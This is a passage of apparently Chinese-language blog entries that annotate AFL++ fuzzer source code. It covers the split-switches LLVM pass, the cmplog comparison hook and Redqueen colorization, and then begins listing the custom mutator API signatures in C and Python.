class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function">BasicBlock *<span class="hljs-title">SplitSwitchesTransform::switchConvert</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">    CaseVector Cases, std::vector&lt;<span class="hljs-type">bool</span>&gt; bytesChecked, BasicBlock *OrigBlock,</span></span><br><span class="hljs-params"><span class="hljs-function">    BasicBlock *NewDefault, Value *Val, <span class="hljs-type">unsigned</span> level)</span> </span>{<br><br>  <span class="hljs-type">unsigned</span>     ValTypeBitWidth = Cases[<span class="hljs-number">0</span>].Val-&gt;<span class="hljs-built_in">getBitWidth</span>();<br>  IntegerType *ValType =<br>      IntegerType::<span class="hljs-built_in">get</span>(OrigBlock-&gt;<span class="hljs-built_in">getContext</span>(), ValTypeBitWidth);<br>  IntegerType *        ByteType = IntegerType::<span class="hljs-built_in">get</span>(OrigBlock-&gt;<span class="hljs-built_in">getContext</span>(), <span class="hljs-number">8</span>);<br>  <span class="hljs-type">unsigned</span>             BytesInValue = bytesChecked.<span class="hljs-built_in">size</span>();<br>  std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; setSizes;<br>  std::vector&lt;std::set&lt;<span class="hljs-type">uint8_t</span>&gt; &gt; <span class="hljs-built_in">byteSets</span>(BytesInValue, std::<span class="hljs-built_in">set</span>&lt;<span class="hljs-type">uint8_t</span>&gt;());<br><br>  <span class="hljs-comment">/* for each of the possible cases we iterate over all bytes of the values</span><br><span class="hljs-comment">   * build a set of possible values at each byte position in byteSets */</span><br>  <span class="hljs-keyword">for</span> (CaseExpr &amp;Case : Cases) {<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; BytesInValue; i++) {<br><br>      <span class="hljs-type">uint8_t</span> byte = (Case.Val-&gt;<span class="hljs-built_in">getZExtValue</span>() &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>;    <span class="hljs-comment">// 获取Case值的每一个字节，存放于byteSets中</span><br>      byteSets[i].<span class="hljs-built_in">insert</span>(byte);<br><br>    }<br><br>  }<br><br>  <span class="hljs-comment">/* find the index of the first byte position that was not yet checked. then</span><br><span class="hljs-comment">   * save the number of possible values at that byte position */</span><br>  <span class="hljs-type">unsigned</span> smallestIndex = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">unsigned</span> smallestSize = <span class="hljs-number">257</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">unsigned</span> i = <span class="hljs-number">0</span>; i &lt; byteSets.<span class="hljs-built_in">size</span>(); i++) {  <span class="hljs-comment">// 这里的代码主要用于递归！！！</span><br><br>    <span class="hljs-keyword">if</span> (bytesChecked[i]) <span class="hljs-keyword">continue</span>;<br>    <span class="hljs-keyword">if</span> (byteSets[i].<span class="hljs-built_in">size</span>() &lt; smallestSize) {<br><br>      smallestIndex = i;<br>      smallestSize = byteSets[i].<span class="hljs-built_in">size</span>();<br><br>    }<br><br>  }<br><br>  <span class="hljs-built_in">assert</span>(bytesChecked[smallestIndex] == <span class="hljs-literal">false</span>);<br><br>  <span class="hljs-comment">/* there are only smallestSize different bytes at index smallestIndex */</span><br><br>  Instruction *Shift, *Trunc;<br>  Function *   F = OrigBlock-&gt;<span class="hljs-built_in">getParent</span>();<br>  BasicBlock * NewNode = BasicBlock::<span class="hljs-built_in">Create</span>(Val-&gt;<span class="hljs-built_in">getContext</span>(), <span class="hljs-string">"NodeBlock"</span>, F);<br>  Shift = BinaryOperator::<span class="hljs-built_in">Create</span>(Instruction::LShr, Val,<br>                                 ConstantInt::<span class="hljs-built_in">get</span>(ValType, smallestIndex * <span class="hljs-number">8</span>));  <span class="hljs-comment">// condition逻辑右移</span><br>  NewNode-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">push_back</span>(Shift);<br><br>  <span class="hljs-keyword">if</span> (ValTypeBitWidth &gt; <span class="hljs-number">8</span>) {<br><br>    Trunc = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TruncInst</span>(Shift, ByteType);  <span class="hljs-comment">// 截断</span><br>    NewNode-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">push_back</span>(Trunc);<br><br>  } <span class="hljs-keyword">else</span> {<br><br>    <span class="hljs-comment">/* not necessary to trunc */</span><br>    Trunc = Shift;<br><br>  }<br><br>  <span class="hljs-comment">/* this is a trivial case, we can directly check for the byte,</span><br><span class="hljs-comment">   * if the byte is not found go to default. if the byte was found</span><br><span class="hljs-comment">   * mark the byte as checked. if this was the last byte to check</span><br><span class="hljs-comment">   * we can finally execute the block belonging to this case */</span><br><br>  <span class="hljs-keyword">if</span> (smallestSize == <span class="hljs-number">1</span>) {<br><br>    <span class="hljs-type">uint8_t</span> byte = *(byteSets[smallestIndex].<span class="hljs-built_in">begin</span>());<br><br>    <span class="hljs-comment">/* insert instructions to check whether the value we are switching on is</span><br><span class="hljs-comment">     * equal to byte */</span><br>    ICmpInst *Comp =<br>        <span class="hljs-keyword">new</span> <span class="hljs-built_in">ICmpInst</span>(ICmpInst::ICMP_EQ, Trunc, ConstantInt::<span class="hljs-built_in">get</span>(ByteType, byte),<br>                     <span class="hljs-string">"byteMatch"</span>);<br>    NewNode-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">push_back</span>(Comp);<br><br>    bytesChecked[smallestIndex] = <span class="hljs-literal">true</span>;<br>    <span class="hljs-type">bool</span> allBytesAreChecked = <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">for</span> (std::vector&lt;<span class="hljs-type">bool</span>&gt;::iterator BCI = bytesChecked.<span class="hljs-built_in">begin</span>(),<br>                                     E = bytesChecked.<span class="hljs-built_in">end</span>();<br>         BCI != E; ++BCI) {<br><br>      <span class="hljs-keyword">if</span> (!*BCI) {<br><br>        allBytesAreChecked = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">break</span>;<br><br>      }<br><br>    }<br><br>    <span class="hljs-comment">//    if (std::all_of(bytesChecked.begin(), bytesChecked.end(),</span><br>    <span class="hljs-comment">//                    [](bool b) { return b; })) {</span><br><br>    <span class="hljs-keyword">if</span> (allBytesAreChecked) {<br><br>      <span class="hljs-built_in">assert</span>(Cases.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>);<br>      BranchInst::<span class="hljs-built_in">Create</span>(Cases[<span class="hljs-number">0</span>].BB, NewDefault, Comp, NewNode);<br><br>      <span class="hljs-comment">/* we have to update the phi nodes! */</span><br>      <span class="hljs-keyword">for</span> (BasicBlock::iterator I = Cases[<span class="hljs-number">0</span>].BB-&gt;<span class="hljs-built_in">begin</span>();<br>           I != Cases[<span class="hljs-number">0</span>].BB-&gt;<span class="hljs-built_in">end</span>(); ++I) {<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isa</span>&lt;PHINode&gt;(&amp;*I)) { <span class="hljs-keyword">continue</span>; }<br>        PHINode *PN = <span class="hljs-built_in">cast</span>&lt;PHINode&gt;(I);<br><br>        <span class="hljs-comment">/* Only update the first occurrence. */</span><br>        <span class="hljs-type">unsigned</span> Idx = <span class="hljs-number">0</span>, E = PN-&gt;<span class="hljs-built_in">getNumIncomingValues</span>();<br>        <span class="hljs-keyword">for</span> (; Idx != E; ++Idx) {<br><br>          <span class="hljs-keyword">if</span> (PN-&gt;<span class="hljs-built_in">getIncomingBlock</span>(Idx) == OrigBlock) {<br><br>            PN-&gt;<span class="hljs-built_in">setIncomingBlock</span>(Idx, NewNode);<br>            <span class="hljs-keyword">break</span>;<br><br>          }<br><br>        }<br><br>      }<br><br>    } <span class="hljs-keyword">else</span> {<br><br>      BasicBlock *BB = switchConvert(Cases, bytesChecked, OrigBlock, NewDefault,<br>                                     Val, level + <span class="hljs-number">1</span>);<br>      BranchInst::<span class="hljs-built_in">Create</span>(BB, NewDefault, Comp, NewNode);<br><br>    }<br><br>  }<br><br>  <span class="hljs-comment">/* there is no byte which we can directly check on, split the tree */</span><br>  <span class="hljs-keyword">else</span> {<br><span class="hljs-comment">// 二分法 分而治之！</span><br>    std::vector&lt;<span class="hljs-type">uint8_t</span>&gt; byteVector;<br>    std::<span class="hljs-built_in">copy</span>(byteSets[smallestIndex].<span class="hljs-built_in">begin</span>(), byteSets[smallestIndex].<span class="hljs-built_in">end</span>(),<br>              std::<span class="hljs-built_in">back_inserter</span>(byteVector));<br>    std::<span class="hljs-built_in">sort</span>(byteVector.<span class="hljs-built_in">begin</span>(), byteVector.<span class="hljs-built_in">end</span>());<br>    <span class="hljs-type">uint8_t</span> pivot = byteVector[byteVector.<span class="hljs-built_in">size</span>() / <span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* we already chose to divide the cases based on the value of byte at index</span><br><span class="hljs-comment">     * smallestIndex the pivot value determines the threshold for the decicion;</span><br><span class="hljs-comment">     * if a case value</span><br><span class="hljs-comment">     * is smaller at this byte index move it to the LHS vector, otherwise to the</span><br><span class="hljs-comment">     * RHS vector */</span><br><br>    CaseVector LHSCases, RHSCases;<br><br>    <span class="hljs-keyword">for</span> (CaseExpr &amp;Case : Cases) {<br><br>      <span class="hljs-type">uint8_t</span> byte = (Case.Val-&gt;<span class="hljs-built_in">getZExtValue</span>() &gt;&gt; (smallestIndex * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>;<br><br>      <span class="hljs-keyword">if</span> (byte &lt; pivot) {<br><br>        LHSCases.<span class="hljs-built_in">push_back</span>(Case);<br><br>      } <span class="hljs-keyword">else</span> {<br><br>        RHSCases.<span class="hljs-built_in">push_back</span>(Case);<br><br>      }<br><br>    }<br><br>    BasicBlock *LBB, *RBB;<br>    LBB = switchConvert(LHSCases, bytesChecked, OrigBlock, NewDefault, Val,<br>                        level + <span class="hljs-number">1</span>);<br>    RBB = switchConvert(RHSCases, bytesChecked, OrigBlock, NewDefault, Val,<br>                        level + <span class="hljs-number">1</span>);<br><br>    <span class="hljs-comment">/* insert instructions to check whether the value we are switching on is</span><br><span class="hljs-comment">     * equal to byte */</span><br>    ICmpInst *Comp =<br>        <span class="hljs-keyword">new</span> <span class="hljs-built_in">ICmpInst</span>(ICmpInst::ICMP_ULT, Trunc,<br>                     ConstantInt::<span class="hljs-built_in">get</span>(ByteType, pivot), <span class="hljs-string">"byteMatch"</span>);<br>    NewNode-&gt;<span class="hljs-built_in">getInstList</span>().<span class="hljs-built_in">push_back</span>(Comp);<br>    BranchInst::<span class="hljs-built_in">Create</span>(LBB, RBB, Comp, NewNode);<br><br>  }<br><br>  <span class="hljs-keyword">return</span> NewNode;<br><br>}<br><br></code></pre></td></tr></tbody></table></figure><ul><li>简单来说，其功能就是将switch分支细粒度化，比如：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">// before spliting switches...</span><br>{<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> x;<br>    <span class="hljs-keyword">switch</span>(x){<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x12345678</span>:<br>            <span class="hljs-built_in">do_something1</span>();<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0x78563412</span>:<br>            <span class="hljs-built_in">do_something2</span>();<br>    }<br>    <br>}<br><span class="hljs-comment">// after spliting switches...</span><br>{<br>    <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">0</span>] == <span class="hljs-number">0x78</span>)<br>        <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">1</span>] == <span class="hljs-number">0x56</span>))<br>            <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">2</span>] == <span class="hljs-number">0x34</span>))<br>                <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">3</span>] == <span class="hljs-number">0x12</span>))<br>                    <span class="hljs-built_in">do_something1</span>();<br>    <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">0</span>] == <span class="hljs-number">0x12</span>)<br>        <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">1</span>] == <span class="hljs-number">0x34</span>))<br>            <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">2</span>] == <span class="hljs-number">0x56</span>))<br>                <span class="hljs-keyword">if</span>((u8*)x[<span class="hljs-number">3</span>] == <span class="hljs-number">0x78</span>))<br>                    <span class="hljs-built_in">do_something2</span>();<br>}<br></code></pre></td></tr></tbody></table></figure></li></ul><h3 id="afl-complier-rt-o-c"><a href="#afl-complier-rt-o-c" class="headerlink" title="afl-complier-rt.o.c"></a>afl-complier-rt.o.c</h3><ul><li>以 <code>__cmplog_ins_hook1</code> 为例：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span> __cmplog_ins_hook1(<span class="hljs-type">uint8_t</span> arg1, <span class="hljs-type">uint8_t</span> arg2, <span class="hljs-type">uint8_t</span> attr) {<br><br>  <span class="hljs-comment">// fprintf(stderr, "hook1 arg0=%02x arg1=%02x attr=%u\n",</span><br>  <span class="hljs-comment">//         (u8) arg1, (u8) arg2, attr);</span><br><br>  <span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(!__afl_cmp_map || arg1 == arg2)) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// Oops? got it!</span><br><br>  <span class="hljs-type">uintptr_t</span> k = (<span class="hljs-type">uintptr_t</span>)__builtin_return_address(<span class="hljs-number">0</span>); <span class="hljs-comment">// __builtin_return_address()返回调用函数的返回地址，0表示当前函数的返回地址，1表示当前函数的调用者的返回地址，以此类推，k为当前函数的返回地址。目的是啥？</span><br>  k = (<span class="hljs-type">uintptr_t</span>)(<span class="hljs-built_in">default_hash</span>((u8 *)&amp;k, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uintptr_t</span>)) &amp; (CMP_MAP_W - <span class="hljs-number">1</span>));  <span class="hljs-comment">//指针（返回地址）进行哈希映射，然后与上CMP_MAP大小：65536</span><br><br>  u32 hits;<br><br>  <span class="hljs-keyword">if</span> (__afl_cmp_map-&gt;headers[k].type != CMP_TYPE_INS) {  <span class="hljs-comment">// 首先命中？</span><br><br>    __afl_cmp_map-&gt;headers[k].type = CMP_TYPE_INS;       <span class="hljs-comment">// type赋值</span><br>    hits = <span class="hljs-number">0</span>; <span class="hljs-comment">// 初始化hits值</span><br>    __afl_cmp_map-&gt;headers[k].hits = <span class="hljs-number">1</span>; <span class="hljs-comment">// 命中值hits初始化为1</span><br>    __afl_cmp_map-&gt;headers[k].shape = <span class="hljs-number">0</span>; <span class="hljs-comment">// ？</span><br><br>  } <span class="hljs-keyword">else</span> {<br><br>    hits = __afl_cmp_map-&gt;headers[k].hits++;  <span class="hljs-comment">// 命中值hits++，将原来命中值赋值给局部变量hits</span><br><br>  }<br><br>  __afl_cmp_map-&gt;headers[k].attribute = attr;  <span class="hljs-comment">// attribute？貌似是1？</span><br><br>  hits &amp;= CMP_MAP_H - <span class="hljs-number">1</span>;  <span class="hljs-comment">// 记录前 CMP_MAP_H（32）次的值，超过 CMP_MAP_H 会替换前面的值</span><br>  __afl_cmp_map-&gt;log[k][hits].v0 = arg1;<br>  __afl_cmp_map-&gt;log[k][hits].v1 = arg2;<br><br>}<br></code></pre></td></tr></tbody></table></figure><h2 id="2-Redqueen"><a href="#2-Redqueen" class="headerlink" title="2. Redqueen"></a>2. Redqueen</h2><h3 id="afl-fuzz-redqueen-c"><a href="#afl-fuzz-redqueen-c" class="headerlink" title="afl-fuzz-redqueen.c"></a>afl-fuzz-redqueen.c</h3><ul><li><p><code>colorization()</code> 填色函数 ==&gt; 生成污点信息</p><ul><li>通过<code>type_replace()</code>函数对输入的每一个字节进行同类型的替换，e.g. 该字节为大写字母，那么就将其替换为其他大写字母</li><li><code>pop_biggest_range()</code>得到ranges [双向链表，用来存储当前输入的切割范围] 最大的范围，判断对当前范围的字节改变是否会影响到路径的变化</li><li>最终得到的ranges链表中的每一个范围表示对该范围进行变异大概率能够引起覆盖率变化，由此生成taint信息</li></ul></li><li><p><code>colorization()</code>后得到一个污点后的输入buf和原始输入orig_buf，然后分别运行这两个测试用例，将cmp覆盖率信息保存以进行后续分析：</p><ul><li><strong>input-to-state</strong>阶段：调用<code>cmp_fuzz()</code>  TODO!</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>AFL++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFLplusplus自定义变异器—源码细节</title>
    <link href="/2023/03/09/AFLplusplus%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E5%BC%82%E5%99%A8%E2%80%94%E6%BA%90%E7%A0%81%E7%BB%86%E8%8A%82/"/>
    <url>/2023/03/09/AFLplusplus%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%98%E5%BC%82%E5%99%A8%E2%80%94%E6%BA%90%E7%A0%81%E7%BB%86%E8%8A%82/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL-自定义变异器"><a href="#AFL-自定义变异器" class="headerlink" title="AFL++自定义变异器"></a>AFL++自定义变异器</h1><ul><li>支持C/C++库和Python模式<ul><li>C/C++ library (<code>*.so</code>)</li><li>Python module</li></ul></li></ul><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p><strong>相关注意事项</strong>：</p><ol><li><code>custom_mutator_stage</code>在确定性变异之后启用；</li><li>在使用C/C++接口时，需要引入一个动态链接库（动态库路径存放在环境变量<code>AFL_CUSTOM_MUTATOR_LIBRARY</code>中），该库（部分）定义AFL++暴露出来的接口</li></ol><p>可参考 <code>custom_mutators/examples</code> 目录下的示例文件</p><hr><h2 id="2-APIs"><a href="#2-APIs" class="headerlink" title="2. APIs"></a>2. APIs</h2><h3 id="总览"><a href="#总览" class="headerlink" title="总览"></a>总览</h3><p><strong>C/C++：</strong></p><figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> *<span class="hljs-title">afl_custom_init</span><span class="hljs-params">(<span class="hljs-type">afl_state_t</span> *afl, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> seed)</span></span>;<br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title">afl_custom_fuzz_count</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">afl_custom_splice_optout</span><span class="hljs-params">(<span class="hljs-type">void</span> *data)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_fuzz</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> **out_buf, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *add_buf, <span class="hljs-type">size_t</span> add_buf_size, <span class="hljs-type">size_t</span> max_size)</span></span>;<br><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-title">afl_custom_describe</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> max_description_len)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_post_process</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> **out_buf)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">afl_custom_init_trim</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_trim</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> **out_buf)</span></span>;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">afl_custom_post_trim</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> success)</span></span>;<br><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_havoc_mutation</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> buf_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> **out_buf, <span class="hljs-type">size_t</span> max_size)</span></span>;<br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title">afl_custom_havoc_mutation_probability</span><span class="hljs-params">(<span class="hljs-type">void</span> *data)</span></span>;<br><span class="hljs-function"><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> <span class="hljs-title">afl_custom_queue_get</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *filename)</span></span>;<br><span class="hljs-built_in">void</span> (*afl_custom_fuzz_send)(<span class="hljs-type">void</span> *data, <span class="hljs-type">const</span> u8 *buf, <span class="hljs-type">size_t</span> buf_size);<br><span class="hljs-function">u8 <span class="hljs-title">afl_custom_queue_new_entry</span><span class="hljs-params">(<span class="hljs-type">void</span> *data, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *filename_new_queue, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *filename_orig_queue)</span></span>;<br><span class="hljs-function"><span class="hljs-type">const</span> <span class="hljs-type">char</span>* <span class="hljs-title">afl_custom_introspection</span><span class="hljs-params">(<span class="hljs-type">my_mutator_t</span> *data)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">afl_custom_deinit</span><span class="hljs-params">(<span class="hljs-type">void</span> *data)</span></span>;<br></code></pre></td></tr></tbody></table></figure><p><strong>python：</strong></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">seed</span>):<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuzz_count</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-keyword">return</span> cnt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">splice_optout</span>()<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fuzz</span>(<span class="hljs-params">buf, add_buf, max_size</span>):<br>    <span class="hljs-keyword">return</span> mutated_out<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">describe</span>(<span class="hljs-params">max_description_length</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">"description_of_current_mutation"</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_process</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-keyword">return</span> out_buf<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init_trim</span>(<span class="hljs-params">buf</span>):<br>    <span class="hljs-keyword">return</span> cnt<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">trim</span>():<br>    <span class="hljs-keyword">return</span> out_buf<br><br><span class="hljs-keyword">def</span> <span 